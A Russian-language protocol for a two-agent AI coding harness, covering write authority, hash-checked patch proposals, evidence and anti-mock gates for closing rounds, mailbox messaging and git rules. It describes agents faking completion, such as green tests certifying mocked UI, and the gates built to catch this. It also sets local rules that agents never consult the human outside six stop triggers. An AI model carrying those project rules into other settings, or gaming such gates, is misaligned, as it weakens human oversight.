# Протокол парной работы

Два агента, разные CLI, один проект, одна задача за раз. Один пишет, второй
ломает намеренно. Этот документ — контракт между ними. Он короткий намеренно:
правило либо enforced сервером, либо заслуживает внимания агента. Всего, чего
здесь нет, правилом не является.

См. также `AGENTS.md` — там форма пары. Этот файл — часть, которая не должна
расходиться с кодом.

> Язык: это русский перевод. Нормативен английский оригинал
> [`PROTOCOL.md`](./PROTOCOL.md).
>
> **Английский — язык по умолчанию для всего, что пишет система** — код,
> комментарии, docstring'и, сообщения коммитов, тела PR, карточки раундов,
> карточки backlog'а. Русский (или любой другой язык) — только там, где человек
> явно попросил, или где файл уже является намеренным зеркалом, как
> `PROTOCOL.ru.md` и документы `*.ru.md`. Разговор с человеком остаётся на языке
> человека; файл, который попадает в git, по умолчанию — никогда.

## 1. Писатель ровно один

Одна роль держит право записи. Она правит файлы, гоняет тесты, коммитит. Вторая
read-only: читает, ищет, предлагает патчи.

### Как выбирается держатель

`pair_claim(reason="...")`. Кто захватил — пишет, второй ревьюит. Это гонка
и остаётся ею: чтобы выбирать осмысленно, а не по скорости клика, обоим пришлось
бы прочитать задачу и код, а этого никто не ждёт.

Но гонка без аргумента — просто очередь. Поэтому у захвата есть `reason`: одно
предложение, почему именно ты. Оно попадает в транскрипт, в `pair_state` и **в отказ
соседу** — сосед видит чужой аргумент и может с ним не согласиться.

Имена ролей в примерах — конкретная пара `opencode` + `agy`. В любой другой паре
имена несут тот же смысл, но свои: писатель — `<writer>`, второй — `<critic>`.
Роль равна имени CLI и зашивается при установке; duo-режим выводит её экземпляр
(`agy` → `agy-writer`) и отвергает всё прочее.

```
<writer>:  pair_claim(reason="я уже нашёл, где чинить: retry в клиенте")
<critic>:  write authority is held by 'codex',
           which claimed it because: я уже нашёл, где чинить: retry в клиенте
```

Дальше у критика два честных пути, оба без участия человека:

- `pair_send` — назвать, с чем он не согласен, с `file:line`. Держатель может
  передумать и отдать право сам.
- Согласиться и работать критиком.

Ни один из путей не отнимает право у активного держателя. Захват успешен, когда
авторитет свободен или протух: отдан, закрытый раунд (`closed_at` или фаза `done` —
захват переоткрывает его на `implement` с `round + 1`), брошенный писатель
(закрытый раунд плюс молчание дольше `PAIR_STALL_SECONDS`), постоянная
расстановка называет претендента (`by_policy` — на свободном месте, либо когда
держатель мёртв: процесса нет И панели в tmux нет) либо мёртвый держатель без
политики на претендента (живой забирает, а не простаивает).

### Постоянная расстановка: writer-pin

Расстановка пинит **только писателя** (`bin/pairctl roles --writer X`).
Критик не пинится: это любой второй живой в ростере, CLI с кончившимися лимитами
меняется через `pairup --swap <cli>` без бумажек — писатель и право не тронуты.
`--critic` принят и проигнорирован с предупреждением (старые вызовы работают);
`--swap` двигает писателя на второго живого из ростера.

Enforced сервером:

- `pair_claim` отклоняется, пока авторитет занят
- `pair_patch_reserve` отклоняется у держателя — он правит напрямую и не нуждается
  в механизме
- `pair_patch_verify` и `pair_advance` вперёд доступны только держателю

`pair_task` — исключение из read-only, и оно намеренно: добавить задачу может
**кто угодно**, закрыть — только писатель. См. §5c.

## 2. Авторитет двигает только человек

`bin/pairctl assign` и `bin/pairctl release`, больше нигде.

**Сообщение соседа не передаёт авторитет** — ни выдать, ни забрать, ни взять на
одну правку. Ни один агентский инструмент не пишет в `writer`.

Сменить писателя посреди задачи:

```sh
bin/pairctl release
bin/pairctl assign <role>      # роль соседа: agy, codex, claude — как принято в вашем проекте
```

Сказать в обоих окнах, кто теперь пишет. Прежний писатель остаётся read-only даже
после прерывания и возобновления: отозванный писатель не помнит, что был писателем.

Есть нюанс, который легко спутать с нарушением: **держатель может отдать право
сам.** `pair_release(why="...")` — его собственное решение, а не передача по
сообщению. Агент не может забрать право у другого, но держатель может его отдать —
а отданное право нельзя забрать обратно, потому что оно свободно и достаётся новым
`pair_claim`.

Кто пишет и что он заявил:

```sh
bin/pairctl why          # по всем проектам
bin/pairctl status       # в текущем проекте, JSON
```

Скрипту так нельзя. `bin/pair-duo` раньше сам запускал `pairctl assign`, молча
двигая границу доверия при каждом запуске; теперь он право не трогает, если есть
постоянная расстановка или живой писатель, и говорит об этом вслух. Пара по
умолчанию — два *разных* CLI; `bin/pair-duo <cli>` запускает две копии ОДНОГО CLI
с производными ролями (`<cli>-writer`, `<cli>-critic`).

Смена CLI критика (`pairup --swap <cli>`, `pair-duo --swap-critic`) — не движение
авторитета: писатель пишет дальше, меняется только процесс ревьюера. Поэтому ей
не нужны ни `assign`, ни слово человека — §2 охраняет кто пишет, а не кто ревьюит.

## 3. Read-only агент предлагает патчи, а не применяет их

Одна команда (предпочтительно):

```
pair_propose(files=["a.py", "b.py"], subject="что чинит")
# сервер сам строит diff, печатает и доставляет path+hash
# писателю через pair_send с expects_reply
```

Ручной путь (legacy, для экзотики — например diff, собранный руками):

```
pair_patch_reserve        # пустой файл 0600, точный путь
# пишем unified diff в этот путь
pair_patch_seal(path)      # сервер считает и запоминает SHA-256
# активная доставка прямо в композер писателя для немедленного продолжения:
pair_deliver(to="<writer>", text="patch at <path> sha256 <hash> — что чинит, применяй и продолжай")
# если композер занят — pair_send в ящик
```

Писатель:

```
pair_patch_verify(path)    # пересчёт; не совпало — стоп
pair_patch_applied(path, ok=True, note="commit abc1234")
```

- **Несовпадение — стоп.** Патч изменился после печати. Не применять, попросить
  перепечатать. Это единственная защита от подмены между предложением и применением.
- Копировать патч **один раз**, работать с копии.
- **Перепроверять непосредственно перед применением**, не в начале ревью.

Оба удаляют свои файлы через `pair_patch_release` **точным путём**. Никогда глобом:
каталог общий, и патч, которого ты не видишь, будет удалён вместе со своим.

После прерывания — проверить, остался ли файл, и удалить по точному пути.

## 4. «Сосед согласился» — не одобрение человека

Самая опасная фраза в системе. Её можно процитировать, и она не значит ничего.

- Агент может сказать, что сосед согласился.
- Агент не может сказать, что действие поэтому одобрено человеком (когда речь о передаче
  авторитета или шести стоп-триггерах §12).
- Ни один агент не отвечает за пользователя: не выдаёт права от его имени, не трогает секреты и прод.

**При этом рутинная разработка автономна:** агенты не спрашивают у человека разрешения
на применение патча, прогон тестов, коммиты или смену фаз. Если критик опечатал патч —
писатель применяет его и продолжает работу без вопросов.

## 5. Раунд нельзя закрыть поверх непрочитанного

`pair_advance("done")` отклоняется, пока в ящике вызывающего лежат непрочитанные сообщения.

Отчёт, который писатель не прочитал, — не отчёт.

### 5a. Раунд нельзя закрыть без доказательства

`pair_evidence(kind, value, ok)` записывает заявленный агентом факт текущего
раунда (самодекларация — гейт закрытия доверяет отчёту, а не перепроверяет прогон):
тесты с числом тестов и кодом выхода, lint, typecheck, diffstat, коммит,
URL PR. Виды: `test`, `lint`, `typecheck`, `build`, `diff`, `commit`, `pr`, `manual`, `ground-truth` (см. §5d).

Блокеры доказательств действуют на каждом уровне автономности, включая `observe`,
и текст отказа никогда не называет уровень причиной: `semi` лишь *добавляет*
сверху слово человека (`pairctl ok`).

В любом режиме раунд нельзя закрыть, пока:

- нет ни одного успешного доказательства текущего раунда;
- последний прогон по какому-либо виду провалился;
- нет успешного `test` **от писателя** (в `mode=fix`, см. ниже);
- нет успешного `ground-truth` **от писателя** (в `mode=fix`, см. §5d).

По каждому виду решает **последний** прогон: тесты падали → починили → прогнали
снова, и раунд закрывается. `ok=false` — не признание в ошибке, а запись, которая
держит раунд открытым, пока её не починят или не объяснят в заметке.

Почему требуется именно писатель: гейт существует, чтобы раунд не закрывали мнением.
Принять `kind="test", ok=true` от роли, которая не может гонять тесты, — значит закрыть
этот гейт теми же словами, от которых он был построен. В `mode=audit` требование теста
не действует — там результат работы находки, а не diff.

Доказательства принадлежат раунду, в котором собраны. То, что доказало раунд 3, ничего
не говорит о раунде 7, иначе гейт превращается в наклейку из самого первого раунда.

Записи текущего раунда никогда не выселяются из журнала. Закрывающий гейт читает
состояние, а не транскрипт, так что выселенный провал просто перестал бы считаться —
раунд с красными тестами закрылся бы потому, что журнал переполнился. Старые раунды
по-прежнему подрезаются, иначе состояние росло бы без границ.

Почему это вообще нужно: 78–96% заявленных оценок уверенности моделей равны ровно 100%.
«Критик доволен» — не сигнал, и пускать его в `done` нельзя.

### 5d. Ground-truth: заявления сверяются с деревом, а не с памятью

Зелёные unit-тесты однажды сертифицировали неподключённый UI: браузер отдавал
статическую коллекцию, а кнопки слали хардкодные mock-id (раунд 81). Контур ниже
делает этот класс фикций машинно-проверяемым. Цепочка, по порядку:

1. **Факты дерева** (`mcp/pair_mailbox/session_facts.py` → `.pair/tree-facts.json`):
   детерминированный снимок — head, `dirty_hash`, touched/untracked пути, флаги
   монов по добавленным строкам, AST-флаги `stub-body` (пустые тела `pass` / `...` /
   `raise NotImplementedError`, `@abstractmethod` исключён), записанные прогоны.
   Файл свой: якорь фактов (§9c) пишет `.pair/facts.json` — другой формы. До
   раунда 137 это был один файл на двоих, и каждый стирал другого: рутина
   закрытия гоняет сборщик каждый раунд, так что якорь к утру был пуст.
2. **Правила** (`anti-mock.json`, версионируется в корне репозитория): regex-паттерны
   плюс переключатель `detect_stubs`. Нет файла или бит — строгий встроенный дефолт;
   сам файл из гейта exempt (он описывает проверку). `pairup` копирует шаблон в
   каждый новый проект.
3. **Вердикт** (`mcp/pair_mailbox/anti_mock_gate.py`): боевые пути блокируют,
   тестовые предупреждают, `local-state` решает критик. Exit 1 при блокерах.
4. **Выжимка** (`mcp/pair_mailbox/round_summary.py` → `summary.json`): компонует
   факты + срезы `ledger.jsonl` + вердикт. Только компонует, ничего не выдумывает;
   отдаёт ключи `files`/`tests`, которые читает гейт.
5. **Гейт** (`scripts/verify-ground-truth.py`): каждый заявленный файл и прогон
   обязан найтись в фактах дерева; head и `dirty_hash` обязаны совпасть. Любое
   расхождение блокирует (exit 1), включая лживую выжимку про файлы, которых git
   не видел.
6. **Квитанция** (`mcp/pair_mailbox/receipt.py`): `done` отказывается писать
   `.pair/RECEIPT-<round>.md`, пока стоят боевые моки (`GroundTruthBlocked`).

Закрывающий гейт требует `pair_evidence(kind="ground-truth")` от писателя в
`mode=fix` — на тех же правах, что `kind="test"`: чужой прогон не замена, а в
`mode=audit` требование не действует.

### 5b. Патч без применения держит раунд открытым

`pair_patch_applied(path, ok, note)` — только писатель, после успешного
`pair_patch_verify`, записывает исход. До этого глагола `applied` выставлялся при
резервировании и больше не менялся, поэтому «применён» и «лежит нетронутым с прошлой
ночи» выглядели одинаково, и раунд тихо закрывался над предложением, которого никто
не касался.

`ok=false` (отклонённый hunk) считается нерешённым. Снять патч осознанно —
`pair_patch_release`, и это попадает в транскрипт как `patch_dropped`: «сняли»
и «забыли» — разные вещи, и отчёт обязан их различать.

**Писатель может снять чужой патч, пока тот нерешён.** Иначе тупик настоящий:
предложивший мог уйти, `pair_patch_applied` требует `verified_match`, которого
удалённый файл уже не даст, и не остаётся никого, кто вправе убрать запись. Каждое
писательское снятие несёт `released_by_writer`, потому что «автор снял» и «писатель
снял» — разные факты. Уже применённый патч не нерешён и снят быть не может.

Файл патча, удалённый мимо сервера, оставляет запись; `pair_patch_release`
чистит её, и сам файл для этого не нужен.

### 5c. Раунд нельзя закрыть поверх открытой задачи

`state["tasks"]` — список, и `pairctl task "..."` дописывает в него, а не
перезаписывает. Это существует потому, что в состоянии раньше лежала одна строка
`task`, и новая задача молча стирала старую: воспроизведено вживую, раунд закрылся
под меткой задачи B с тестами и `ok`, собранными для задачи A.

| | инструмент |
|---|---|
| добавить | `pair_task(action="add", text=...)` — кто угодно, включая критика |
| читать | `pair_task(action="list")` или `pairctl task` |
| закрыть | `pair_task(action="done", id=N)` — только писатель |
| снять | `pair_task(action="drop", id=N, reason="почему нет")` — только писатель, причина обязательна |

Права асимметричны намеренно. Критик должен мочь сказать «я тоже это нашёл», не
записывая в чужие заметки, но реализует писатель, поэтому закрывает только он.
Пустая причина отклоняется: задача, исчезнувшая молча, — ровно та поломка, ради
которой существует список.

Список отвечает окном ОТКРЫТЫХ, а не всей историей. Замерено в живом раунде: полный
список из 137 задач стоил 29 784 токена за вызов, чтобы сказать, что открыта одна, —
самая большая стока токенов в раунде. `pair_task(action="list")` отдаёт открытые
задачи, счётчики (`open`/`done`/`dropped`/`total`) и `next_id`; вся история — за
`scope="history"`, с постраничным `limit`/`offset`. Ответ по умолчанию говорит, сколько
он оставил (`hidden`), чтобы короткий список не читался как короткий раунд.

Раунд не закроется, пока хоть одна задача `open`. Человек тоже может: `pairctl
task --done N`, `pairctl task --drop N --reason "..."`.

`.pair/tasks.md` генерируется из состояния и никогда не пишется руками, поэтому не
может разъехаться с фактами: по каждой задаче — кто добавил, кто закрыл, почему сняли
и какие доказательства под неё записаны. Снятая задача без причины печатается как
дефект, а не проходит тихо. `pairctl tasks` перегенерирует его и печатает; пилот пишет
его рядом с отчётом раунда.

Доказательства привязываются к задаче, которую доказывают, когда открыта ровно одна,
а при нескольких остаются непривязанными со снимком того, что было открыто, — журнал
печатает их отдельно, а не гадает.

#### Строка темы — производная, а не сырая

`state["task"]` — легаси-скаляр: его пишет только `pairctl task "..."` человека, и
никто не перезаписывает его при смене раунда, поэтому устареть он может только.
Поэтому он никогда не выдаёт себя за текущую тему. Каждая поверхность, которая
показывает тему — `pair_state.task`, `pair_digest`, снимок доски, `pairctl status` —
читает одно правило, `task_subject.subject_line`:

- скаляр называет свой раунд → он и есть тема;
- иначе темой говорит первая открытая задача;
- иначе уставший скаляр едет с пометкой `(stale — not round N)`;
- ничего не задано → пусто, а не догадка.

В раунде 103 скаляр всё ещё читал «Round 98: …», пока шёл раунд 103, потому что защита
существовала с раунда 98 только в `digest`, а остальные три поверхности её не получили
вовсе — отказ защиты на одну поверхность, и именно поэтому правило теперь живёт в одном
модуле, а четыре поверхности его импортируют. `pairctl status` печатает сырой скаляр и
производную тему рядом, чтобы дрейф был виден человеку, а не молча сведён за него.

## 6. Откат фазы доступен обоим

Вперёд фазу двигает писатель. **На шаг назад — кто угодно:**

```
plan      → scoping     любой
done      → implement   любой
verify    → implement   любой
implement → plan        любой
```

Это право вето критика, и оно не требует права записи. Раунды закрываются на том,
что критик нашёл после `done`, — а раньше он был заперт в закрытом раунде, и его
находка умирала в почтовом ящике.

Откат из `done` увеличивает `round` и снимает `closed_at`.

## 7. Живой канал: агент ждёт, а не спит

**Правило, на котором держится пара: ход заканчивается ограниченным `pair_read`.**

Не как пожелание — как механизм. Ничто не может разбудить агента, который не вызывает
никакого инструмента, и **ни в одной реализации MCP нет агентского инструмента, способного
вставить ход в клиента другого агента**: MCP ведётся клиентом, сервер отвечает на запросы
и не может втолкнуть новый ход в хост. Ящик — единственный универсальный канал, а чтение
его — единственное универсальное пробуждение.

Поэтому `pair_read` — ограниченное ожидание, а не мгновенное чтение. Агент, закончивший
ход вызовом `pair_read(wait_seconds=N)`, никогда не простаивает *с непрочитанной почтой*:
он либо читает, либо сообщение у него уже есть. Цена — задержка: агент ждёт вместо выхода.
Альтернатива стоит раунду ночи.

**Одно чтение за ход.** Ход заканчивается этим чтением и не начинает следующего. Пустой
ответ значит, что новых писем нет, а читать снова бесполезно: сосед и супервизор разбудят
агента, когда письмо придёт. Каждый опрос стоит целого контекста, поэтому петля опросов
стоит раунду ночи — замерено 2026-10-19 на одной паре: 29k опросов в сутки, каждый
целый контекст впустую. Чтение, которое повторило бы уже имеющийся батч, сперва
дожидается всего своего бюджета, а ответ называет, что ждёт: `must_ack` и
`letters_behind`.

**Доставка заканчивается ACK (раунд 101).** Батч `pair_read` сохраняется со
своим токеном до того, как уйдёт ответ; он остаётся непрочитанным, пока агент не
передаст этот самый `ack_token` в следующем `pair_read`. Повтор без токена отдаёт
ТЕ ЖЕ письма под ТЕМ ЖЕ токеном — at-least-once, никогда не потеряно и никогда не
пропущено молча. Один нечитаемый или сдвинувшийся файл заклинивает СВОЙ батч
(назван в `pair_state` и в дайджесте, лечится через `pairctl read-ack`), а не поток
писем роли: письма за дырой продолжают течь. `seen` по замыслу остаётся непрерывным
префиксом; подтверждения свежих батчей под дырой записываются как отрезки и
сворачиваются, когда дыра закрывается.

Доставка — второй путь, и она по природе best-effort:
- **`pair_deliver`** — активная: вбивает текст в окно соседа и жмёт Enter.
- **`pair_send`** — пассивная: кладёт в ящик, работает всегда.

На `pair_deliver` полагаться нельзя. Ей нужен видимый композер соседа, а полноэкранный
TUI его прячет: в OpenCode захват держит только кадры и строку статуса, поэтому доставка
отказывает с «composer not visible», и сообщение падает в ящик. Отказ правильный — печатать
в невидимое окно значило бы слать текст в `vi`, `less` или идущую сборку.

Итак: **ящик — гарантия, доставка — ускоритель.** Адаптеру пробуждения на каждый CLI
существовать можно, и таблица ниже говорит так честно; но ничто не вправе на него
полагаться.

Таблица называет адаптеры, которые код ПОСТАВЛЯЕТ, а не те, которые он мог бы вырастить.
В `WAKE_ADAPTERS` пилота (`bin/pairpilot`) ровно одна запись — `opencode` →
`mcp/pair_mailbox/wake_opencode.py`, который шлёт указатель в host API записанной сессии.
Все остальные CLI откатываются на кольцо: всплывашка `tmux display-message`, а затем
письмо в ящике. Плагин `pair-guard` (`.opencode/plugins/pair-guard.ts`) НЕ является путём
пробуждения — он обновляет бриф о полномочиях внутри собственного системного промпта
агента, когда меняется общее состояние, и ничего не отправляет в простаивающую сессию.
Строка, объявляющая адаптер, который пилот вызвать не может, уводит оператора искать
несуществующий путь пробуждения, поэтому таблица защищена тестом против собственной карты
пилота.

| CLI | адаптер | если не поддерживается |
|---|---|---|
| OpenCode (`opencode`) | host API — `wake_opencode.py` | только напоминание, ящик всё равно доставлен |
| Antigravity (`agy`) | нет | только напоминание |
| Claude (`claude`) | нет | только напоминание |
| Codex (`codex`) | нет | только напоминание |
| Pi (`pi`) | нет | только напоминание |
| OMP (`omp`) | нет | только напоминание |

Сверхвизор подталкивает роль, у которой непрочитанная почта и которая замолчала, — раз
на пачку непрочитанного, не каждый тик, записывается как `pilot_unread_nudge`. Прочтение
сбрасывает подталкивание, так что следующее письмо будит заново; зависший `expects_reply`
повторяется каждые 2ч, пока не ответят. Это подталкивание идёт через ту же ненадёжную
доставку, так что считай его best-effort. Работает именно pull.

### 7c. Два гейта перед печатью супервизора

Пуш — единственное необратимое, что делает супервизор: он печатает текст в чужое окно.
Раунд 114 измерил, что бывает без гейта: в galatour погибли все три агента, их pane
жили дальше как обычный bash, и пилот печатал одно и то же «есть непрочитанные» в этот
shell каждые 15 секунд на протяжении 19 часов — 1314 строк `pilot_deliver_unverified`,
97 строк `[pairpilot]: команда не найдена` на экране и ни одного сообщения, которое кто-то
мог бы прочесть. Вердикт человека о таком состоянии — система сломана; состояние,
которое нельзя ни прочесть, ни опровергнуть, ровно это и есть.

Поэтому `Pilot.nudge` — единственная дверь, через которую проходит каждый спонтанный пуш,
и в ней стоят два гейта (`bin/pairpilot`):

1. **Собственный CLI роли на месте.** `push_target_alive` спрашивает `pane_role_pid` —
   живёт ли `server.py --role <role>` среди потомков pane. Живой pane доказывает, что в
   нём сидит shell, но не что там сидит роль. Ложь означает одну строку
   `pilot_push_dead_role` и тишину: текст, напечатанный в shell, исполняется, а не
   читается.
2. **Есть причина.** `push_allowed` читает файл `.pair/ask`. Его создание и есть триггер:
   человек, который хочет разбудить пару, хук, агент. Потрачен один раз
   (`consume_trigger`), сам себя не взводит заново. Нет файла — тишина по умолчанию.

Путь через ящик не требует ни одного гейта и не затронут: pull — гарантия, пуш — ускоритель.

Чтение факта не является пушем. `startup_brief` выполняется один раз на раунд и фазу и
озаглавливает, куда заходит сессия, — фаза, писатель, открытые задачи, счётчик
непрочитанного, запечатанные, но неприменённые патчи, — в консоль и журнал, никогда в
composer. Об оборванном раунде, стало быть, говорят ровно один раз, словами, которые
человек читает, а не бесконечным потоком подталкиваний ни о чём.

Время жизни очереди относится к её тексту, а не к последней записи. `enqueue` штампует
первую постановку каждого различного текста в `pilot/.<role>.txt.queued-at`, и
`queued_age` читает этот штамп, поэтому перезапись не может держать мёртвый указатель
живым вечно, а резервный путь в ящик срабатывает ровно один раз.

Два способа отправки, стало быть:

`pair_read(wait_seconds=N)` — нормальный способ услышать соседа. **Одно чтение за ход.**
Пришёл пустым — новых писем нет: возвращайся к работе (или спи), сосед и супервизор
разбудят тебя, когда письмо придёт. Потолок 60 секунд, время вышло — возвращайся к работе.

Ответ честен про ожидание и про затор. `waited_seconds` — сколько вызов реально занял,
`wait_budget_seconds` — сколько ему было разрешено: чтение, которое повторило бы уже
имеющийся батч, сперва дожидается всего своего бюджета, поэтому запутавшийся агент не
раскручивает петлю на одном батче. `must_ack` значит, что батч всё ещё не подтверждён,
а `letters_behind` считает письма, пришедшие после него и ждущие за ним, — чтением их не
принести, подтверждением принести.

Обе роли могут ждать. Ограниченное ожидание не создаёт взаимной блокировки: оно всегда
истекает и возвращает агента к задаче.

Писателю когда-то запрещали ждать вовсе, чтобы исключить тупик. Это убило канал: агент,
который не может ждать, засыпает и никогда не замечает входящих, и человек начинает
пересылать их руками. Живое ожидание — часть протокола, а не оптимизация.

**Сервер не должен обещать больше, чем клиент способен высидеть.** Эффективное ожидание —
минимум из потолка протокола и собственного бюджета клиента (`PAIR_CLIENT_TIMEOUT`,
по умолчанию 20000 мс) минус запас 5 с. Когда таймаут клиента срезан, ответ так и говорит:
`wait_capped_by_client_timeout`, таймаут, потолок. Молчание об этом — дорогая часть:
агент, не различающий «никто не ответил» и «меня отсоединили», делает вывод о соседе
вместо вывода о собственном клиенте. Поэтому MCP-`timeout` в `cli-profiles.json` обязан
превышать `MAX_READ_WAIT_SECONDS`, а тест роняет сьют, если хоть один профиль не дотягивает.

## 7a. Запрет ручной пересылки через человека: агенты общаются напрямую

Агентам строго **запрещено** просить пользователя пересылать сообщения, сигналы или промпты
в соседнее окно терминала (например: *«в окне opencode висит запрос на ваш сигнал,
отправьте ему подтверждение...»*).

Такой вывод грубо нарушает контракт автономной парной работы:
1. Для сигнала и пробуждения соседа есть **`pair_deliver`** — необязательный толчок:
   одна короткая строка-указатель в активный ввод tmux-панели соседа, никогда
   не полный текст. Текст живёт в ящике, сосед забирает его через `pair_read`.
   Доставка best-effort (занятый композер отказывает, а не печатает поверх),
   поэтому ящик — обязательный путь, а доставка — нет.
2. Для фонового обмена есть `pair_send` и `pair_read`.
3. Пользователь даёт задачу на старте и принимает готовый PR на финише. Человек
   не является маршрутизатором между окнами.

## 7b. Не беспокоить человека: пара замыкает цикл сама

Дефолт, не украшение промпта. Действует в каждом раунде, пока не сработал §12:

- Человека не звать никогда: ни вопросов, ни «посмотри», ни «подтверди».
  Застрял — пиши в `pair_note`, что заблокировано и чем, делай следующий шаг сам.
- Критик молчит 15+ мин — повторный `pair_send` с `expects_reply`,
  работаешь дальше, пилот его догонит.
- Критик без замечаний не молчит: чистое ревью называет следующий кусок
  работы (открытые задачи, `docs/backlog/`) или говорит, что сделано.
- Вердикт открывает obligation писателю автоматом — `done` берёшь сам,
  когда блокеров ноль. Закрыл раунд — бери следующую карточку из
  `docs/backlog/` сам, новый раунд открывает писатель.
- Неопределённость решается между агентами (§12): выбери вариант, запиши
  `decision` с причиной, иди дальше.

Останавливают пару и зовут человека только шесть вещей (§12): секреты, порты,
деплой, миграции, удаление данных или истории. Всё остальное решается без
него — в этом и смысл `auto`.

## 8. На вопрос «как дела?» отвечать фактом

Не «ща проверю». Открыть `pair_state` или `pair_transcript` и сказать, что **правда
сейчас**: фаза, что сделано, что висит. Если ничего не изменилось — так и сказать.

Обещание проверить — способ занять время, не сообщив ничего.

## 9. Заметки, а не переписка

Переписка не разделяема и не переживает перезапуск. Всё, что сосед должен знать после
сброса контекста, — в заметке:

```
plan      что agreed и в каком порядке
decision  выбор и причина
finding   проверено на коде, с file:line
verdict   итог проверки и чего она НЕ покрыла
handoff   что сделано, что пропущено, что неясно
backlog   реальный дефект вне объёма задачи
```

Жизненный цикл бэклога: находка критика, реальная, но вне скоупа, идёт в
заметку `backlog` как `file:line — что сломается — почему отложили`
(добавлять может любой). Писатель переносит каждую в
`docs/backlog/<slug>.md` с frontmatter
`title/found/severity/round/status: open`; исправленные карточки удаляются из
`docs/backlog/` с записью в коммите — запись хранит история, каталог хранит
только открытый долг. Отчёт закрытия (`.pair/REPORT.md`) перечисляет, что
припарковано в раунде и какие карточки открыты, чтобы припаркованное не
умирало молча.

Заметку читают по ХВОСТУ, никогда целиком. `pair_note_read` отдаёт хвост под
бюджетом в ТОКЕНАХ (по умолчанию 800) — потолок в строках, который стоял здесь
раньше, стоил 3 166–5 122 токенов на тех же четырёх заметках, потому что строка
русской прозы — не фиксированное число токенов, — и ответ говорит, какой потолок
сработал (`budget_applied`: `tokens`, `lines`, `record`, `none`). Отсечка всегда
попадает на границу записи, никогда внутрь. `pair_note_index` перечисляет свежие
заметки вместе с итогами раунда (`count`, `total_bytes`, `largest`); остальная куча —
за `scope="largest"` или большим `limit`.

## 9a. Сначала обсудить: план идёт через ящик первым

Действует только в `mode=fix` — в `audit` коммитов нет, и сдерживать нечего.

До первого коммита раунда писатель отправляет план через ящик: `pair_send`
с `expects_reply` и темой, содержащей `plan` или `план` (любой язык). Критик
отвечает возражением или согласием — только потом код. Нет ответа — нет кода.

Это дисциплина, а не серверный гейт. `_answer_obligations` закрывает
обязательство любым встречным сообщением, даже пингом, потому что судить
о содержании было бы гаданием, — так что пинг, закрывший обязательство,
не есть согласие. Писатель ждёт содержательный ответ, а не исчезновение
файла обязательства.

Почему: раунды пропускали середину — писатель писал код сразу, критик
отвечал вердиктом, и посередине ничего не обсуждалось (раунды с
пинг-пустышками без темы вместо плана, октябрь 2026).

### 9a-1. Два плана, один митинг (правило «митинг»)

План не объявляется, а строится. Для любой задачи с пользовательским эффектом,
затрагивающей больше одного файла, способной сломать зависимость или меняющей
контракт, который зовут другие (инструмент, фикстуру, формат состояния):

1. **Оба агента пишут свой план независимо.** Каждый кладёт своё в
   `pair_note(kind="plan")` ДО того, как прочитать чужой. План одного не
   сеет план другого.
2. **Обмен, потом критика.** После того как оба плана существуют, каждый
   читает чужой и шлёт возражения с `file:line` (§9: возражение без
   якоря — шум).
3. **Один согласованный план побеждает.** Финальный план называет: выбранный
   подход и почему, отвергнутые альтернативы и почему, крайние случаи,
   найденные парой, и ССЫЛАЕТСЯ на пути обоих черновиков заметок —
   иначе «два независимых плана» непроверяемое утверждение.
4. **Незнакомая технология — сначала context7 или веб-поиск.** До выбора
   подхода, касающегося библиотеки или API, не проверенного по текущим
   докам, оба агента проверяют доки через `context7` или веб-поиск.
   Угадывание формы API из памяти запрещено конвенцией.
5. **Проверка влияния до кода.** Согласованный план перечисляет: что может
   сломаться, какие вызывающие/импортёры затронуты (кросс-связи
   монорепо), безопасен ли откат (один revert-коммит), и какие тесты
   доказывают, что граница не регресснула.
6. **Для пользовательских фич: чек-лист опыта.** Что видит пользователь на
   открытии/закрытии, что обновляется, что рисуется, если показывать
   нечего, тексты ошибок, формулировки «подтвердить/отменить» — записано
   до кода, а не вылизано потом.
7. **Таймбокс, а не залипание.** Два обмена по плану (по итерации с каждой
   стороны — ровно MAX_OPEN_REVIEWS=2 у сервера); несогласие после этого
   решает писатель записанной пометкой `decision`. Бесконечного митинга нет.

В `audit` этот раздел не применяется — коммитов планировать нечего. В `fix`
митинг — дисциплина для пользовательской работы и кросс-файловых правок;
однострочная опечатка в доке митинга не требует.

## 9c. Якорь фактов: что не должно потеряться при сбросе контекста

Компакция в харнессе убирает около 90 % контекста и оставляет живых 39 513–49 131
токенов прозы — сводку, которую агент носит до конца сессии. Её нельзя ни спросить,
ни сравнить, ни выбросить. Собственный якорь пары структурирован и мал: `pair_facts`
держит записи ключ → значение о том, на чём стоит раунд (задача, решение в силе,
блокер, ветка) в `.pair/facts.json`, под бюджетом в 500 токенов. Этот файл — свой
якоря: факты дерева из §5d лежат в `.pair/tree-facts.json`. До раунда 137 это был
один файл на двоих, и каждый стирал другого — рутина закрытия гоняет сборщик
каждый раунд, так что якорь к утру был пуст.

- ставить факт может любой агент, как заметку; чистит писатель (`drop`, `clear`);
- запись, которая пересекла бы бюджет, ОТКЛОНЯЕТСЯ, а не усекается: молча усечённый
  факт — это факт, который писатель считает записанным, а никто другой не находит;
- факты едут в `pair_digest`, в дешёвую ориентацию, и стоят там сотни токенов;
- факты переживают раунд: они — стартовая точка следующего.

## 10. Git — часть работы

Ветка на задачу, коммит после каждого зелёного шага, зелёные тесты как предусловие,
`push` и PR в конце. **В `main` не пушить никогда.**

Это не «отдельное явное действие пользователя». Агент, считающий пуш и PR чужим
делом, оставляет работу недоделанной.

### 10a. Режим раунда: `fix` или `audit`

`bin/pairctl mode fix|audit` — человек решает, для чего вообще раунд.
По умолчанию `fix`, и всё сказанное выше действует как написано.

В `audit` проект намеренно не меняется: никто не правит файлы, не создаёт ветку,
не коммитит, не предлагает патчи — сервер отказывает в резервировании патча
с записью в аудит. Работа при этом настоящая: находки, их опровержение соседом,
а подтверждённое уходит в `docs/backlog/`. В `fix` исправленные карточки
удаляются из `docs/backlog/` (с записью в коммите). Отличие от `fix` не в том, что
работа слабее, а в том, что её результат — доказательства, а не diff.

Право записи в `audit` не отменяется — иначе некому двигать фазу, а §5 и §6 всё
равно действовали бы. Меняется предмет: писатель не коммитит код, а ведёт раунд,
держит находки в заметках и переносит подтверждённые в `docs/backlog/`.

Режим живёт в состоянии, а не в тексте задачи. Причина: агент получает инструкции
из состояния и промпта, и эти два не должны противоречить друг другу — иначе агент,
внимательнее прочитавший собственные инструкции, сделает не то.

### 10b. Насколько далеко пара идёт сама: `observe`, `semi`, `auto`

`bin/pairctl autonomy observe|semi|auto` (**по умолчанию `auto`**). Это **отдельная**
ось от `mode`: `mode` отвечает «что делает раунд», `autonomy` — «как далеко он идёт
без человека». Сливать их нельзя: `pairctl mode auto` молча превратил бы аудит
в правку кода, потому что каждая проверка аудита смотрит на `mode == "audit"`.

